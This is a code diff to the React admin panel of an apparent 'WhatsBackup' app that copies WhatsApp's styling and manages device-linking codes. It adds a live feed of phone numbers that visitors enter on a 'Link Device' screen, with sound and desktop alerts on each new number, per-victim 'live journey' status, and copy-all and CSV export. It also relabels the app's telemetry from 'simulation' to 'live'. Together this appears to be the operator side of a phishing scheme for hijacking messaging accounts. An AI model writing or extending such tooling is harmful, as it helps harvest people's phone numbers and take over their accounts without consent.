@@ -21,8 +21,14 @@ import {
   Copy,
   ChevronDown,
   ChevronUp,
+  Phone,
+  Volume2,
+  VolumeX,
+  Bell,
+  Trash2,
+  Download,
 } from 'lucide-react';
-import { AdminConfig, LinkedDevice, BackupRecord, RealtimeSyncStatus } from '../types';
+import { AdminConfig, LinkedDevice, BackupRecord, RealtimeSyncStatus, UserSubmission } from '../types';
 import {
   updateRemoteDeviceConnection,
   SUPABASE_TABLE_SETUP_SQL,
@@ -30,6 +36,13 @@ import {
   logoutAdminRemote,
   getCurrentAdminUser,
   updateAdminPasswordRemote,
+  fetchUserSubmissions,
+  deleteUserSubmission,
+  clearAllUserSubmissions,
+  subscribeToUserSubmissionsRealtime,
+  playNotificationSound,
+  requestBrowserNotificationPermission,
+  showBrowserNotification,
 } from '../services/supabaseClient';
 
 interface AdminPanelProps {
@@ -84,6 +97,12 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({
   const [credSaveError, setCredSaveError] = useState<string | null>(null);
   const [isUpdatingPassword, setIsUpdatingPassword] = useState<boolean>(false);
 
+  // User Submissions State (Live phone numbers)
+  const [submissions, setSubmissions] = useState<UserSubmission[]>([]);
+  const [isLoadingSubmissions, setIsLoadingSubmissions] = useState<boolean>(false);
+  const [soundEnabled, setSoundEnabled] = useState<boolean>(true);
+  const [numbersCopied, setNumbersCopied] = useState<boolean>(false);
+
   // Check for existing active session on mount
   useEffect(() => {
     let isMounted = true;
@@ -121,6 +140,51 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({
   useEffect(() => {
     if (adminConfig.adminEmail) setLoginEmail(adminConfig.adminEmail);
   }, [adminConfig.adminEmail]);
+
+  // Load and listen to live user submissions over Supabase Realtime
+  useEffect(() => {
+    if (!isAuthenticated) return;
+    setIsLoadingSubmissions(true);
+
+    fetchUserSubmissions({
+      customUrl: adminConfig.supabaseUrl,
+      customAnonKey: adminConfig.supabaseAnonKey,
+    }).then((res) => {
+      if (res.success) {
+        setSubmissions(res.data);
+      }
+      setIsLoadingSubmissions(false);
+    });
+
+    const unsubscribe = subscribeToUserSubmissionsRealtime(
+      (newRecord) => {
+        setSubmissions((prev) => [newRecord, ...prev.filter((s) => s.id !== newRecord.id)]);
+        if (soundEnabled) {
+          playNotificationSound();
+        }
+        showBrowserNotification(
+          '🔔 New Phone Number Submitted',
+          `${newRecord.phone_number} (${newRecord.country_name})`
+        );
+      },
+      (updatedRecord) => {
+        setSubmissions((prev) =>
+          prev.map((s) => (s.id === updatedRecord.id ? updatedRecord : s))
+        );
+      },
+      (deletedId) => {
+        setSubmissions((prev) => prev.filter((s) => s.id !== deletedId));
+      },
+      {
+        customUrl: adminConfig.supabaseUrl,
+        customAnonKey: adminConfig.supabaseAnonKey,
+      }
+    );
+
+    return () => {
+      unsubscribe();
+    };
+  }, [isAuthenticated, adminConfig.supabaseUrl, adminConfig.supabaseAnonKey, soundEnabled]);
 
   // Handle Login submission via real Supabase Auth
   const handleLogin = async (e: React.FormEvent) => {
@@ -242,6 +306,9 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({
         return;
       }
 
+      lastSavedCodeRef.current = sanitized;
+      isEditingCodeRef.current = false;
+
       const updated: AdminConfig = {
         ...adminConfig,
         linkingCode: sanitized,
@@ -250,8 +317,6 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({
         updatedAt: new Date().toISOString(),
       };
 
-      lastSavedCodeRef.current = sanitized;
-      isEditingCodeRef.current = false;
       onUpdateAdminConfig(updated);
       setSaveSuccess(true);
       setTimeout(() => setSaveSuccess(false), 2500);
@@ -367,6 +432,65 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({
       result += chars.charAt(Math.floor(Math.random() * chars.length));
     }
     setCodeInput(result);
+  };
+
+  // Handle single submission deletion
+  const handleDeleteSubmission = async (id: string) => {
+    setSubmissions((prev) => prev.filter((s) => s.id !== id));
+    await deleteUserSubmission(id, {
+      customUrl: adminConfig.supabaseUrl,
+      customAnonKey: adminConfig.supabaseAnonKey,
+    });
+  };
+
+  // Handle clear all submissions
+  const handleClearAllSubmissions = async () => {
+    if (!window.confirm('Are you sure you want to clear all phone submissions?')) return;
+    setSubmissions([]);
+    await clearAllUserSubmissions({
+      customUrl: adminConfig.supabaseUrl,
+      customAnonKey: adminConfig.supabaseAnonKey,
+    });
+  };
+
+  // Handle copy all numbers
+  const handleCopyAllNumbers = () => {
+    if (submissions.length === 0) return;
+    const text = submissions
+      .map((s) => `${s.phone_number} - ${s.country_name} (${new Date(s.created_at).toLocaleString()}) [${s.current_step}]`)
+      .join('\n');
+    navigator.clipboard.writeText(text);
+    setNumbersCopied(true);
+    setTimeout(() => setNumbersCopied(false), 2000);
+  };
+
+  // Handle CSV export
+  const handleExportCsv = () => {
+    if (submissions.length === 0) return;
+    const headers = ['Phone Number', 'Country', 'Current Step', 'Device Platform', 'Date & Time'];
+    const rows = submissions.map((s) => [
+      `"${s.phone_number}"`,
+      `"${s.country_name}"`,
+      `"${s.current_step}"`,
+      `"${s.device_platform}"`,
+      `"${new Date(s.created_at).toISOString()}"`,
+    ]);
+    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map((e) => e.join(','))].join('\n');
+    const encodedUri = encodeURI(csvContent);
+    const link = document.createElement('a');
+    link.setAttribute('href', encodedUri);
+    link.setAttribute('download', `whatsbackup_submissions_${new Date().toISOString().slice(0, 10)}.csv`);
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  };
+
+  // Handle desktop notification permission request
+  const handleEnableNotifications = async () => {
+    const granted = await requestBrowserNotificationPermission();
+    if (granted) {
+      showBrowserNotification('🔔 WhatsBackup Live Alert', 'Desktop notifications are active!');
+    }
   };
 
   // 1. IF NOT LOGGED IN: DISPLAY AUTHENTICATION GATE
@@ -530,7 +654,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({
             <div>
               <h1 className="text-base sm:text-lg font-bold">Admin Control Center</h1>
               <p className="text-[11px] sm:text-xs text-emerald-100 leading-tight">
-                Manage demo linking authorization codes, device permissions, and simulation telemetry
+                Manage demo linking authorization codes, device permissions, and live telemetry
               </p>
             </div>
           </div>
@@ -549,7 +673,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({
 
         {/* Dashboard Stat Badges */}
         <div className="p-3 sm:p-6 border-b border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-[#182229]">
-          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 sm:gap-4">
+          <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 sm:gap-3">
             <div className="p-2.5 sm:p-3.5 bg-white dark:bg-[#111b21] rounded-xl border border-slate-200 dark:border-slate-800 shadow-xs">
               <span className="text-[11px] text-slate-500 dark:text-slate-400 block mb-1">Active Linking Code</span>
               <span className="text-base font-bold text-slate-900 dark:text-white font-mono tracking-wider">
@@ -557,21 +681,29 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({
               </span>
             </div>
 
-            <div className="p-3.5 bg-white dark:bg-[#111b21] rounded-xl border border-slate-200 dark:border-slate-800 shadow-xs">
+            <div className="p-2.5 sm:p-3.5 bg-white dark:bg-[#111b21] rounded-xl border border-slate-200 dark:border-slate-800 shadow-xs">
               <span className="text-[11px] text-slate-500 dark:text-slate-400 block mb-1">Service Status</span>
               <span className={`text-sm font-bold ${adminConfig.isActive ? 'text-emerald-600 dark:text-emerald-400' : 'text-rose-600 dark:text-rose-400'}`}>
                 {adminConfig.isActive ? 'Operational' : 'Disabled (Offline)'}
               </span>
             </div>
 
-            <div className="p-3.5 bg-white dark:bg-[#111b21] rounded-xl border border-slate-200 dark:border-slate-800 shadow-xs">
-              <span className="text-[11px] text-slate-500 dark:text-slate-400 block mb-1">Virtual Devices Linked</span>
+            <div className="p-2.5 sm:p-3.5 bg-white dark:bg-[#111b21] rounded-xl border border-slate-200 dark:border-slate-800 shadow-xs">
+              <span className="text-[11px] text-slate-500 dark:text-slate-400 block mb-1">Phone Submissions</span>
+              <span className="text-base font-bold text-[#00a884] dark:text-[#25D366] font-mono tabular-nums flex items-center gap-1.5">
+                <Phone className="w-3.5 h-3.5" />
+                <span>{submissions.length}</span>
+              </span>
+            </div>
+
+            <div className="p-2.5 sm:p-3.5 bg-white dark:bg-[#111b21] rounded-xl border border-slate-200 dark:border-slate-800 shadow-xs">
+              <span className="text-[11px] text-slate-500 dark:text-slate-400 block mb-1">Virtual Devices</span>
               <span className="text-base font-bold text-slate-900 dark:text-white font-mono tabular-nums">
                 {linkedDevice.isLinked ? '1 Connected' : '0 Devices'}
               </span>
             </div>
 
-            <div className="p-3.5 bg-white dark:bg-[#111b21] rounded-xl border border-slate-200 dark:border-slate-800 shadow-xs">
+            <div className="p-2.5 sm:p-3.5 bg-white dark:bg-[#111b21] rounded-xl border border-slate-200 dark:border-slate-800 shadow-xs col-span-2 sm:col-span-1">
               <span className="text-[11px] text-slate-500 dark:text-slate-400 block mb-1">Total Demo Archives</span>
               <span className="text-base font-bold text-slate-900 dark:text-white font-mono tabular-nums">
                 {backupHistory.length}
@@ -746,6 +878,166 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({
             </div>
           </form>
 
+          {/* SECTION 2: LIVE USER SUBMISSIONS (REAL-TIME PHONE NUMBERS) */}
+          <div className="space-y-4 pt-4 border-t border-slate-200 dark:border-slate-800">
+            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
+              <div>
+                <h2 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
+                  <Phone className="w-4 h-4 text-[#075E54] dark:text-[#25D366]" />
+                  <span>Live Phone Submissions ({submissions.length})</span>
+                </h2>
+                <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
+                  Phone numbers entered by visitors upon clicking Next with timestamps and live journey status.
+                </p>
+              </div>
+
+              {/* Action Controls */}
+              <div className="flex flex-wrap items-center gap-2">
+                {/* Sound Toggle */}
+                <button
+                  type="button"
+                  onClick={() => setSoundEnabled(!soundEnabled)}
+                  className={`px-2.5 py-1.5 rounded-lg text-xs font-medium flex items-center gap-1.5 transition-colors cursor-pointer border ${
+                    soundEnabled
+                      ? 'bg-emerald-50 dark:bg-emerald-950/40 text-emerald-700 dark:text-emerald-300 border-emerald-200 dark:border-emerald-800'
+                      : 'bg-slate-100 dark:bg-slate-800 text-slate-500 border-slate-200 dark:border-slate-700'
+                  }`}
+                  title={soundEnabled ? 'Audio Alert is ON (Chimes on new submission)' : 'Audio Alert is Muted'}
+                >
+                  {soundEnabled ? <Volume2 className="w-3.5 h-3.5 text-emerald-600" /> : <VolumeX className="w-3.5 h-3.5 text-slate-400" />}
+                  <span>{soundEnabled ? 'Ding ON' : 'Muted'}</span>
+                </button>
+
+                {/* Desktop Notification */}
+                <button
+                  type="button"
+                  onClick={handleEnableNotifications}
+                  className="px-2.5 py-1.5 rounded-lg text-xs font-medium flex items-center gap-1.5 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 transition-colors cursor-pointer border border-slate-200 dark:border-slate-700"
+                  title="Enable Browser Desktop Notification Alert"
+                >
+                  <Bell className="w-3.5 h-3.5 text-amber-500" />
+                  <span>Desktop Alert</span>
+                </button>
+
+                {/* Copy All Numbers */}
+                <button
+                  type="button"
+                  onClick={handleCopyAllNumbers}
+                  disabled={submissions.length === 0}
+                  className="px-2.5 py-1.5 rounded-lg text-xs font-medium flex items-center gap-1.5 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 disabled:opacity-50 transition-colors cursor-pointer border border-slate-200 dark:border-slate-700"
+                  title="Copy all phone numbers"
+                >
+                  <Copy className="w-3.5 h-3.5" />
+                  <span>{numbersCopied ? 'Copied!' : 'Copy'}</span>
+                </button>
+
+                {/* Export CSV */}
+                <button
+                  type="button"
+                  onClick={handleExportCsv}
+                  disabled={submissions.length === 0}
+                  className="px-2.5 py-1.5 rounded-lg text-xs font-medium flex items-center gap-1.5 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 disabled:opacity-50 transition-colors cursor-pointer border border-slate-200 dark:border-slate-700"
+                  title="Export to Excel / CSV"
+                >
+                  <Download className="w-3.5 h-3.5" />
+                  <span>Export CSV</span>
+                </button>
+
+                {/* Clear All */}
+                {submissions.length > 0 && (
+                  <button
+                    type="button"
+                    onClick={handleClearAllSubmissions}
+                    className="px-2.5 py-1.5 rounded-lg text-xs font-medium flex items-center gap-1 bg-rose-50 dark:bg-rose-950/40 hover:bg-rose-100 text-rose-700 dark:text-rose-300 transition-colors cursor-pointer border border-rose-200 dark:border-rose-800"
+                    title="Clear all records"
+                  >
+                    <Trash2 className="w-3.5 h-3.5" />
+                    <span>Clear</span>
+                  </button>
+                )}
+              </div>
+            </div>
+
+            {/* Submissions Table / Empty State */}
+            <div className="rounded-xl border border-slate-200 dark:border-slate-800 overflow-hidden bg-white dark:bg-[#111b21]">
+              {isLoadingSubmissions ? (
+                <div className="p-8 text-center text-xs text-slate-400 flex items-center justify-center gap-2">
+                  <RefreshCw className="w-4 h-4 animate-spin text-[#00a884]" />
+                  <span>Loading submissions from Supabase...</span>
+                </div>
+              ) : submissions.length === 0 ? (
+                <div className="p-8 text-center text-xs text-slate-400">
+                  <Phone className="w-8 h-8 mx-auto mb-2 text-slate-300 dark:text-slate-600" />
+                  <p className="font-semibold text-slate-600 dark:text-slate-300">No phone numbers submitted yet.</p>
+                  <p className="mt-1 text-[11px] text-slate-400">
+                    When visitors enter their phone number on the Link Device screen and click Next, their numbers and live journey will appear here in real time.
+                  </p>
+                </div>
+              ) : (
+                <div className="overflow-x-auto max-h-[320px]">
+                  <table className="w-full text-left text-xs">
+                    <thead className="bg-slate-50 dark:bg-[#182229] border-b border-slate-200 dark:border-slate-800 text-slate-600 dark:text-slate-400 font-semibold sticky top-0 z-10">
+                      <tr>
+                        <th className="py-2.5 px-3">Phone Number</th>
+                        <th className="py-2.5 px-3">Country</th>
+                        <th className="py-2.5 px-3">Date & Time</th>
+                        <th className="py-2.5 px-3">Live Journey</th>
+                        <th className="py-2.5 px-3">Device</th>
+                        <th className="py-2.5 px-3 text-right">Action</th>
+                      </tr>
+                    </thead>
+                    <tbody className="divide-y divide-slate-100 dark:divide-slate-800 font-sans">
+                      {submissions.map((sub) => (
+                        <tr key={sub.id} className="hover:bg-slate-50/70 dark:hover:bg-[#182229]/60 transition-colors">
+                          <td className="py-2.5 px-3 font-mono font-bold text-slate-900 dark:text-white text-xs">
+                            {sub.phone_number}
+                          </td>
+                          <td className="py-2.5 px-3 text-slate-600 dark:text-slate-300">
+                            {sub.country_name}
+                          </td>
+                          <td className="py-2.5 px-3 text-[11px] font-mono text-slate-500 dark:text-slate-400 whitespace-nowrap">
+                            {new Date(sub.created_at).toLocaleString([], {
+                              month: 'short',
+                              day: 'numeric',
+                              hour: '2-digit',
+                              minute: '2-digit',
+                              second: '2-digit',
+                            })}
+                          </td>
+                          <td className="py-2.5 px-3 whitespace-nowrap">
+                            <span
+                              className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-semibold ${
+                                sub.current_step.includes('Connected') || sub.current_step.includes('Complete')
+                                  ? 'bg-emerald-100 dark:bg-emerald-950/60 text-emerald-700 dark:text-emerald-300'
+                                  : 'bg-blue-100 dark:bg-blue-950/60 text-blue-700 dark:text-blue-300'
+                              }`}
+                            >
+                              <span className="w-1.5 h-1.5 rounded-full bg-current animate-pulse"></span>
+                              <span>{sub.current_step}</span>
+                            </span>
+                          </td>
+                          <td className="py-2.5 px-3 text-[11px] text-slate-500 dark:text-slate-400">
+                            {sub.device_platform}
+                          </td>
+                          <td className="py-2.5 px-3 text-right">
+                            <button
+                              type="button"
+                              onClick={() => handleDeleteSubmission(sub.id)}
+                              className="p-1 rounded text-slate-400 hover:text-rose-600 hover:bg-rose-50 dark:hover:bg-rose-950/50 transition-colors cursor-pointer"
+                              title="Delete record"
+                            >
+                              <Trash2 className="w-3.5 h-3.5" />
+                            </button>
+                          </td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                </div>
+              )}
+            </div>
+          </div>
+
           {/* SECTION: ADMIN PASSWORD UPDATE */}
           <form onSubmit={handleSavePassword} className="space-y-4 pt-4 border-t border-slate-200 dark:border-slate-800">
             <div>
@@ -916,7 +1208,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({
             </form>
           </div>
 
-          {/* SECTION 2: DEVICE LINK CONTROL */}
+          {/* SECTION 5: DEVICE LINK CONTROL */}
           <div className="space-y-4 pt-4 border-t border-slate-200 dark:border-slate-800">
             <div>
               <h2 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
@@ -970,7 +1262,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({
             </div>
           </div>
 
-          {/* SECTION 3: SYSTEM AUDIT LOG PREVIEW */}
+          {/* SECTION 6: SYSTEM AUDIT LOG PREVIEW */}
           <div className="space-y-4 pt-4 border-t border-slate-200 dark:border-slate-800">
             <div>
               <h2 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
